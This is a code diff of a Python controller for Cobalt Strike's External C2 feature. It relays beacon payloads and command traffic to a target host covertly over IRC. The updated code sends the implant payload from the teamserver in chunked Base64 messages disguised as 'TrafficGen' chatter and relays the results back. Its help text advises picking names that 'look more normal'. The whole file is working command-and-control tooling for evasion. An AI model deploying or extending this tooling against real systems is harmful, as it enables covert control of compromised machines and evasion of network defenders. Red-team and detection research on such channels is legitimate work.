@@ -9,11 +9,11 @@
     It is not complete and has errors.
     Instead of using cloakify to convert Base64 messages to normal looking strings, it just sends the Base64 
     message over IRC.
-        
-    Current limitations: Allows for external C2 over IRC but only for small commands (<500 bytes). Large transfer
-    is broken due to incorrectly breaking up and parsing Base64 messages.
+
+    Update 15 Jan 2020: Fixed bug causing crash on large data transfer.
     
 """
+import argparse
 import base64
 import ipaddress
 import socket
@@ -26,7 +26,7 @@ class IRCinfo:
     """
     @brief Class to hold info for IRC session
     """
-    def __init__(self, src_ip, ip, port, nick, password, user, real_name, channel, client_nick):
+    def __init__(self, src_ip, ip, port, nick, op_nick, op_password, user, real_name, channel, client_nick):
         """
 
         :param ip: IP address of IRC server
@@ -42,7 +42,8 @@ class IRCinfo:
         self.ip = ip
         self.port = port
         self.nick = nick
-        self.password = password
+        self.op_nick = op_nick
+        self.op_password = op_password
         self.user = user
         self.real_name = real_name
         self.channel = channel
@@ -132,54 +133,67 @@ class ExternalC2Controller:
         :param ircinfo: Class with user IRC info
         :param data: Data to send to beacon
         """
-        # TODO: Check this. It is likely broken!!
+        pingmsg = "PRIVMSG #{} :PING\r\n".format(ircinfo.channel)
         if len(data) == 1:
-            pingmsg = "PRIVMSG {} :PING\r\n".format(ircinfo.channel)
             self._socketBeacon.sendall(pingmsg.encode())
+        elif len(data) < 1:
+            print("Error: len(data) < 1")
+            return None
         else:
-            # print("len(data):{}".format(len(data)))
-            # print("data:{}".format(data))
             frame = self.encode_frame(data)
-            # print("len(frame):{}".format(len(frame)))
+
             encodedmsg = self.base64(frame)
-            # print("len(encodedmsg):{}".format(len(encodedmsg)))
-            # print("encodedmsg:{}".format(encodedmsg))
             encodedmsg = self.equalcheck(encodedmsg)
+
+            # print("length of frame: {}".format(len(frame)))
+            # print("length of encoded data: {}".format(len(encodedmsg)))
+
+            # Send len of encodedmsg so client can malloc recv buffer
+            ircencodedlen = "PRIVMSG #{} :Len-{}\r\n".format(ircinfo.channel, len(encodedmsg))
+            self._socketBeacon.sendall(ircencodedlen.encode())
             
-            #if len(encodedmsg) > 450:
             offset = 0
+            # Break up message by 425 bytes. Max IRC message size is 512 per RFC. Got errors when I tried 480 and 499.
             while offset < len(encodedmsg):
                 if offset + 425 > len(encodedmsg):
-                    ircencodedmsg = "PRIVMSG {} :TrafficGen-{}\r\n".format(ircinfo.channel,
+                    ircencodedmsg = "PRIVMSG #{} :TrafficGen-{}\r\n".format(ircinfo.channel,
                                                                            encodedmsg[offset:].decode())
                     self._socketBeacon.sendall(ircencodedmsg.encode())
                     break
                 else:
-                    ircencodedmsg = "PRIVMSG {} :TrafficGen-{}\r\n".format(ircinfo.channel, 
+                    ircencodedmsg = "PRIVMSG #{} :TrafficGen-{}\r\n".format(ircinfo.channel, 
                                                                            encodedmsg[offset:offset+425].decode())
                     offset += 425
                     self._socketBeacon.sendall(ircencodedmsg.encode())
-                
-            # print("Sending encoded msg:{}".format(encodedmsg.decode()))
-            #ircencodedmsg = "PRIVMSG {} :TrafficGen-{}\r\n".format(ircinfo.channel, encodedmsg.decode())
-            #self._socketBeacon.sendall(ircencodedmsg.encode())
+                    # Add delay so we dont get Max sendq error
+                    time.sleep(0.05)
+            print("Finished sending to beacon..")
 
-    def recvFromBeacon(self):
+    def recvFromBeacon(self, ircinfo):
         """
-        
+
+        :param ircinfo: Class with user IRC info
         :return: data received from beacon
         """
-        # TODO: Check this! It is likely broken.
         data = ""
         message = ""
+        quitting = "PRIVMSG #{} :quitting\r\n".format(ircinfo.channel)
+        quitmsg = "QUIT :\r\n"
+        traffic = "PRIVMSG #{} :TrafficGen-".format(ircinfo.channel)
+        chanexit = "PRIVMSG #{} :exit".format(ircinfo.channel)
+        client_quit = "Client exiting: {}".format(ircinfo.client_nick)
         while True:
-            data = self._socketBeacon.recv(1024).decode()
+            data = self._socketBeacon.recv(4096).decode()
             if len(data) != 0:
                 print("From IRC Server: {}".format(data))
             self.ping_check(data)
+            if data.find("ERROR") != -1:
+                print("Server sent error.")
+                if data.find("Closing Link") != -1:
+                    print("Error was to close link!")
+                    return None
             
             if data.find("PRIVMSG ") != -1:
-                traffic = "PRIVMSG {} :TrafficGen-".format(ircinfo.channel)
                 if data.find(traffic) != -1:
                     offset = data.find(traffic)
                     if offset != -1:
@@ -189,22 +203,19 @@ class ExternalC2Controller:
                         b64msg = data[offset:-2]
                         message += b64msg
                         if data.find("==") != -1:
-                            print("Base64 msg:{}".format(message))
+                            # print("Base64 msg:{}".format(message))
                             message = self.debase64(message)
                             break
 
-                quitting = "PRIVMSG {} :quitting\r\n".format(ircinfo.channel)
-                quitmsg = "QUIT :\r\n"
-                chanexit = "PRIVMSG {} :exit".format(ircinfo.channel)
                 if data.find(chanexit) != -1:
                     self._socketBeacon.sendall(quitting.encode())
                     self._socketBeacon.sendall(quitmsg.encode())
                     
-            if data.find("ERROR") != -1:
-                print("Server sent error.")
-                if data.find("Closing Link") != -1:
-                    print("Error was to close link!")
-                    return None
+            if data.find(client_quit) != -1:
+                print("Client quit, also exiting..")
+                self._socketBeacon.sendall(quitting.encode())
+                self._socketBeacon.sendall(quitmsg.encode())
+        
         return message[4:]
 
     def ping_check(self, data):
@@ -223,14 +234,14 @@ class ExternalC2Controller:
         :param ircinfo: Class with user IRC info
         """
         time.sleep(1)
-        password = "PASS {}\r\n".format(ircinfo.password)
+        password = "PASS {}\r\n".format(ircinfo.op_password)
         self._socketBeacon.sendall(password.encode())
         nick = "NICK {}\r\n".format(ircinfo.nick)
         self._socketBeacon.sendall(nick.encode())
         user = "USER {} {} {} :{}\r\n".format(ircinfo.user, "0", "*", ircinfo.real_name)
         self._socketBeacon.sendall(user.encode())
         while True:
-            data = self._socketBeacon.recv(1024).decode()
+            data = self._socketBeacon.recv(4096).decode()
             print("From IRC Server: {}".format(data))
 
             self.ping_check(data)
@@ -241,52 +252,15 @@ class ExternalC2Controller:
 
         userhost = "USERHOST {}\r\n".format(ircinfo.user)
         self._socketBeacon.sendall(userhost.encode())
-        data = self._socketBeacon.recv(1024).decode()
+        data = self._socketBeacon.recv(4096).decode()
         print("From IRC Server: {}".format(data))
-
-    def dcc_listen(self, ircinfo, port):
-        """
-        
-        :param ircinfo: Class with user IRC info
-        :param port: Port to listen on
-        :return: True if successful, False if not
-        """
-        self._socketDCC = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
-        self._socketDCC.bind((ircinfo.src_ip, port))
-        self._socketDCC.settimeout(60.0)
-        try:
-            self._socketDCC.listen(1)
-        except socket.timeout:
-            print("Didn't receive connection from client in time! (60 sec)")
-            self._socketDCC.close()
-            return False
-
-        self._socketDCCConn = self._socketDCC.accept()[0]
-        print("Received DCC connection")
-        return True
-
-    def dcc_send(self, filename, filesize, port, ircinfo):
-        """
-        
-        :param filename: Name of file to send (not used by client) 
-        :param filesize: Size of file to send
-        :param port: Port to listen on
-        :param ircinfo: Class with user IRC info
-        :return: True if successful, False if not
-        """
-        dcc_notice = "NOTICE {} :DCC Send {} ({})\r\n".format(ircinfo.client_nick, filename, ircinfo.src_ip)
-        dcc_send = "PRIVMSG {} :\01DCC SEND {} {} {} {}\01\r\n" \
-            .format(ircinfo.client_nick, filename, int(ipaddress.IPv4Address(ircinfo.src_ip)), port, filesize)
-        self._socketBeacon.sendall(dcc_notice.encode())
-        self._socketBeacon.sendall(dcc_send.encode())
-        return self.dcc_listen(ircinfo, port)
 
     def join_channel(self, ircinfo):
         """
 
         :param ircinfo: Class with user IRC info
         """
-        join = "JOIN {}\r\n".format(ircinfo.channel)
+        join = "JOIN #{}\r\n".format(ircinfo.channel)
         self._socketBeacon.sendall(join.encode())
         
     def become_oper(self, ircinfo):
@@ -294,7 +268,7 @@ class ExternalC2Controller:
 
         :param ircinfo: Class with user IRC info
         """
-        oper = "OPER {} {}\r\n".format(ircinfo.client_nick, ircinfo.password)
+        oper = "OPER {} {}\r\n".format(ircinfo.op_nick, ircinfo.op_password)
         self._socketBeacon.sendall(oper.encode())
 
     def wait_for_client(self, ircinfo):
@@ -303,20 +277,20 @@ class ExternalC2Controller:
         :return: True if cloak message is seen, False if Closing Link message is seen
         """
         while True:
-            data = self._socketBeacon.recv(1024).decode()
+            data = self._socketBeacon.recv(4096).decode()
             if len(data) != 0:
                 print("From IRC Server: {}".format(data))
 
             self.ping_check(data)
 
             if data.find("PRIVMSG ") != -1:
-                cloak = "PRIVMSG {} :cloak".format(ircinfo.channel)
+                cloak = "PRIVMSG #{} :cloak".format(ircinfo.channel)
                 if data.find(cloak) != -1:
                     return True
 
-                quitting = "PRIVMSG {} :quitting\r\n".format(ircinfo.channel)
+                quitting = "PRIVMSG #{} :quitting\r\n".format(ircinfo.channel)
                 quitmsg = "QUIT :\r\n"
-                chanexit = "PRIVMSG {} :exit".format(ircinfo.channel)
+                chanexit = "PRIVMSG #{} :exit".format(ircinfo.channel)
                 if data.find(chanexit) != -1:
                     self._socketBeacon.sendall(quitting.encode())
                     self._socketBeacon.sendall(quitmsg.encode())
@@ -361,49 +335,36 @@ class ExternalC2Controller:
         # Receive the beacon payload from CS to forward to our custom beacon
         data = self.recv_from_ts()
 
-        # Client is connected to IRC, now transfer beacon via DCC
-        # TODO: make this into a function
-        # TODO: make file name and port configurable (1024 is mIRC default)
-        if self.dcc_send("filetransfer.txt", len(data), 1024, ircinfo):
-            self._socketDCCConn.sendall(self.encode_frame(data))
-            self._socketDCCConn.close()
-            self._socketDCC.close()
-        else:
-            return False
+        # Send beacon payload to target
+        self.sendToBeacon(ircinfo, data)
 
         while True:
-            data = self.recvFromBeacon()
+            data = self.recvFromBeacon(ircinfo)
+            if data == None:
+                print("Error/exit from beacon")
+                break
             print("Received %d bytes from beacon" % len(data))
 
             print("Sending %d bytes to TS" % len(data))
             self.send_to_ts(data)
 
             data = self.recv_from_ts()
-            print("Received %d bytes from TS" % len(data))
-            # If bigger than 2048 then send over DCC file transfer
-            if len(data) > 2048:
-                # Client is connected to IRC, now transfer beacon via DCC
-                # TODO: make file name and port configurable (1024 is mIRC default)
-                if self.dcc_send("filetransferexample.txt", len(data), 1024, ircinfo):
-                    self._socketDCCConn.sendall(self.encode_frame(data))
-                    self._socketDCCConn.close()
-                    self._socketDCC.close()
-                else:
-                    return False
-            else:
-                print("Sending %d bytes to beacon" % len(data))
-                self.sendToBeacon(ircinfo, data)
+            print("Received %d bytes from TS and sending to beacon" % len(data))
+            self.sendToBeacon(ircinfo, data)
 
 
-if len(sys.argv) != 10:
-    print("Number of args passed: {}".format(len(sys.argv)))
-    print("Args: {}".format(str(sys.argv)))
-    print("Incorrect number of args: \"[SRC_IP]\" \"[IP]\" \"[PORT]\" \"[NICK]\" \"[PASS]\" \"[USER]\" \"[REAL_NAME]\""
-          " \"[CHANNEL]\" \"[CLIENT_NICK]\"")
-else:
-    controller = ExternalC2Controller(2222)
-    # ircinfo = IRCinfo("192.168.136.130", "192.168.136.128", 6667, "servbot", "bot", "covertserv", "covertIRCserv",
-    #                   "#bot", "bot")
-    ircinfo = IRCinfo(sys.argv[1], sys.argv[2], int(sys.argv[3]), sys.argv[4], sys.argv[5], sys.argv[6], sys.argv[7], 
-                      sys.argv[8], sys.argv[9])
-    controller.run(ircinfo)
+parser = argparse.ArgumentParser(description='Program to provide covert communications over IRC for Cobalt Strike using the External C2 feature.')
+parser.add_argument('src_ip', help="IP of teamserver (or redirector)")
+parser.add_argument('irc_ip', help="IP of IRC server, not teamserver. (i.e. UnrealIRCd server)")
+parser.add_argument('irc_port', type=int, help="Port number of IRC server. Typically 6667")
+parser.add_argument('nick', help="Name your server will use in IRC")
+parser.add_argument('op_nick', help="Nick of operator you will authenticate as.")
+parser.add_argument('op_pass', help="Password used for authenticating as operator")
+parser.add_argument('user', help="User your server will use. Only passed to look more normal, choose any normal/expected username.")
+parser.add_argument('real_name', help="Realname your server will use. Only passed to look more normal, choose any normal/expected realname.")
+parser.add_argument('channel', help="Channel your server will connect to. Enter without #, we do that for you.")
+parser.add_argument('client_nick', help="Nick of client you will talk to. You need to set this to the NICK you pass to your client program on target")
+args = parser.parse_args()
+controller = ExternalC2Controller(2222)
+ircinfo = IRCinfo(args.src_ip, args.irc_ip, args.irc_port, args.nick, args.op_nick, args.op_pass, args.user, args.real_name, args.channel, args.client_nick)
+controller.run(ircinfo)
